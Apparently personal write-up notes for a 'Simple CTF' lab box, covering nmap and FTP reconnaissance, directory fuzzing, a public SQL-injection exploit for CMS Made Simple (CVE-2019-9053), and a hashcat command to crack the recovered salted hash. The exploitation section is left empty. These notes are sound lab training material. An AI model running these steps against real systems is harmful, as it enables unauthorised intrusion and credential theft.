
# Simple CTF 

## Summary:
No summary present 😢


## (----------RECON----------)
Target IP Address: 10.10.231.22
Attack Box IP Address: 10.10.97.62
test update
webserver: http://10.10.231.22:80

## (----------SCANNING---------)

#### Port Scan Results
Nmap scan report for 10.10.231.22
Host is up (0.00066s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.97.62
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2 df
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)

MAC Address: 02:AD:35:BF:50:35 (Unknown)
Device type: general purpose|specialized
Running (JUST GUESSING): Linux 3.X (98%), Crestron 2-Series (90%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:crestron:2_series
Aggressive OS guesses: Linux 3.10 - 3.13 (98%), Linux 3.8 (92%), Crestron XPanel control system (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

#### Trace Route Results
TRACEROUTE
HOP RTT     ADDRESS
1   0.66 ms 10.10.231.22

#### Open Ports Identified 
OPEN PORTS: 
21 - FTP
80 - http (webserver)
2222 - ssh (high level port)

#### Investigation

##### FTP Server
Investigating the FTP server we see Anonymous FTP login allowed
Logging in with:
```plaintext
ftp 10.10.231.22
```
Results:
Connected to 10.10.231.22.
220 (vsFTPd 3.0.3)
Name (10.10.231.22:root):

Providing the username: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

Enumerating the files/directories on the server we see the following hierarchal tree:
Location: ftp> 
Directories
| _ pub
   | _ ForMitch.txt
   
1 file identified on FPT server within the directory named "pub"

extracting this file using:
```plaintext
mget *
```

Exiting the FTP server with `bye`

Viewing the contents of the extracted file provides:
*Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!*

This identifies potential weak passwords on the host 

##### Web server find
![[Pasted image 20250216165527.png]]
\- Default apache2 ubuntu page 

fuzzing directories:
```plaintext
dirb http://10.10.231.22/80 common.txt
```

### directory results: 

DIRB v2.22    
By The Dark Raver

-----------------

START_TIME: Sun Feb 16 17:07:34 2025
URL_BASE: http://10.10.231.22:80/
WORDLIST_FILES: common.txt

-----------------

GENERATED WORDS: 1942                                                          

---- Scanning URL: http://10.10.231.22:80/ ----
==> DIRECTORY: http://10.10.231.22:80/simple/                                       
---- Entering directory: http://10.10.231.22:80/simple/ ----
==> DIRECTORY: http://10.10.231.22:80/simple/admin/                            
==> DIRECTORY: http://10.10.231.22:80/simple/assets/                           
==> DIRECTORY: http://10.10.231.22:80/simple/doc/                              
==> DIRECTORY: http://10.10.231.22:80/simple/lib/                              
==> DIRECTORY: http://10.10.231.22:80/simple/modules/                          
==> DIRECTORY: http://10.10.231.22:80/simple/tmp/                              
==> DIRECTORY: http://10.10.231.22:80/simple/uploads/                               
---- Entering directory: http://10.10.231.22:80/simple/admin/ ----
==> DIRECTORY: http://10.10.231.22:80/simple/admin/lang/                       
==> DIRECTORY: http://10.10.231.22:80/simple/admin/plugins/                    
==> DIRECTORY: http://10.10.231.22:80/simple/admin/templates/                  
==> DIRECTORY: http://10.10.231.22:80/simple/admin/themes/                        
---- Entering directory: http://10.10.231.22:80/simple/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)     
---- Entering directory: http://10.10.231.22:80/simple/doc/ ----    
---- Entering directory: http://10.10.231.22:80/simple/lib/ ----
==> DIRECTORY: http://10.10.231.22:80/simple/lib/assets/                       
==> DIRECTORY: http://10.10.231.22:80/simple/lib/classes/                      
==> DIRECTORY: http://10.10.231.22:80/simple/lib/lang/                         
==> DIRECTORY: http://10.10.231.22:80/simple/lib/plugins/                           
---- Entering directory: http://10.10.231.22:80/simple/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)     
---- Entering directory: http://10.10.231.22:80/simple/tmp/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)     
---- Entering directory: http://10.10.231.22:80/simple/uploads/ ----
==> DIRECTORY: http://10.10.231.22:80/simple/uploads/images/                        
---- Entering directory: http://10.10.231.22:80/simple/admin/lang/ ----     
---- Entering directory: http://10.10.231.22:80/simple/admin/plugins/ ----     
---- Entering directory: http://10.10.231.22:80/simple/admin/templates/ ----     
---- Entering directory: http://10.10.231.22:80/simple/admin/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)   
---- Entering directory: http://10.10.231.22:80/simple/lib/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)    
---- Entering directory: http://10.10.231.22:80/simple/lib/classes/ ----
==> DIRECTORY: http://10.10.231.22:80/simple/lib/classes/internal/                
---- Entering directory: http://10.10.231.22:80/simple/lib/lang/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)    
---- Entering directory: http://10.10.231.22:80/simple/lib/plugins/ ----    
---- Entering directory: http://10.10.231.22:80/simple/uploads/images/ ----    
---- Entering directory: http://10.10.231.22:80/simple/lib/classes/internal/ ----

-----------------
END_TIME: Sun Feb 16 17:07:51 2025
DOWNLOADED: 25246 - FOUND: 0

above shows that the directory /simple is a CMS - content management system 
![[Pasted image 20250216194440.png]]
-  CMS Made Simple version 2.2.8

Researching this version of the Content management system has revealed:
32 results for potential exploitation within exploit DB
Identified the following exploit that is most suitable per CMS version:
Released: 2019-04-02	
Title: CMS Made Simple < 2.2.10 - SQL Injection	
Type: WebApps	
Platform: PHP	
Author: Daniele Scanu
CVE ID: CVE-2019-9053

proceeded to download this executable - titled "46635.py"

added the provided wordlist to the python script located under - 
`/usr/share/seclists/Passwords/Common-Credentials/best110.txt`

Identified the script required python 2

further to execute this exploit using the following command:
```plaintext
python 46635.py -u http://10.10.231.22/simple
```

this script will then attempt to identify the following
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

As we can see by the above results the password for the account is hashed and salted
this will require cracking using the following command:
```bash
hashcat -O -a 0 -m 10 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2DDD
```



### file results

```bash
dirb http://10.10.231.22:80 -x ext.txt
```

---- Scanning URL: http://10.10.231.22:80/ ----
+ http://10.10.231.22:80/index.html (CODE:200|SIZE:11321)                                           
+ http://10.10.231.22:80/robots.txt (CODE:200|SIZE:929)          


investigating the contents of robots.txt shows the following:

##### Robots.txt content:
\#
\# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
\#
\#   This file tells search engines not to index your CUPS server.
\#
\#   Copyright 1993-2003 by Easy Software Products.
\#
\#   These coded instructions, statements, and computer programs are the
\#   property of Easy Software Products and are protected by Federal
\#   copyright law.  Distribution and use rights are outlined in the file
\#   "LICENSE.txt" which should have been included with this file.  If this
\#   file is missing or damaged please contact Easy Software Products
\#   at:
\#
\#       Attn: CUPS Licensing Information
\#       Easy Software Products
\#       44141 Airport View Drive, Suite 204
\#       Hollywood, Maryland 20636-3111 USA
\#
\#       Voice: (301) 373-9600
\#       EMail: cups-info@cups.org
\#         WWW: http://www.cups.org
\#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
\#
\# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
\#




## (----------EXPLOITATION----------)


## (----------RESULTS-----------)